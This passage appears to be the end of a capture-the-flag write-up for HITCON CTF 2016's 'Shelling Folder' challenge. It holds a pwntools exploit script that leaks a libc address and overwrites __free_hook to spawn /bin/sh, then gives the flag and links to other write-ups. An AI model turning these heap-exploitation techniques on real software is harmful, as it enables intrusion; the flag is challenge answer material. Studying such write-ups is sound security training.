CreateDir("BBBB")
CreateFile("C"*24+p8(0x10),64)
Remove("BBBB")		
Calc()
List()

p.recvuntil("----------------------\n")

#Print Libc addresss
libcAddr = u64(p.recv(6).ljust(8,"\x00"))
libc.addresss += libcAddr - 0x3c4b78
systemAddr = libc.symbols['system']
freeHook = libc.symbols['__free_hook']
execve = libc.addresss + 0x4647c

log.info("Heap Addresss : " + hex(heapAddr))
log.info("Libc Addresss : " + hex(libcAddr))
log.info("execve('/bin/sh') : " + hex(execve))
log.info("__free_hook() : " + hex(freeHook))

#Overflow freeHook -> systemAddr
CreateFile("D"*24+p64(freeHook)[:7], (execve & 0xffffffff))		#Create File
CreateFile("E"*24+p64(freeHook+4)[:7], (execve & 0xffffffff00000000)>>32)	#Create File
Calc()

#execve("/bin/sh")
Remove("D"*24+p64(freeHook)[:7])

p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | hitcon&#123;Sh3llingF0ld3r\_Sh3rr1nf0rd\_Pl4y\_w17h\_4\_S1mpl3\_D4t4\_Ori3nt3d\_Pr0gr4mm1n7&#125; |

## **Related Site**

* <http://blog.dazzlepppp.cn/2016/11/12/HITCON-CTF-2016-ShellingFolder/>
* <http://bruce30262.logdown.com/posts/976496-hitcon-ctf-2016-quals-shelling-folder>
* <https://github.com/ret2libc/ctfs/tree/master/hitcon2016quals/shellingfolder>
* <https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html>
* <http://database.sarang.net/study/glibc/3.htm>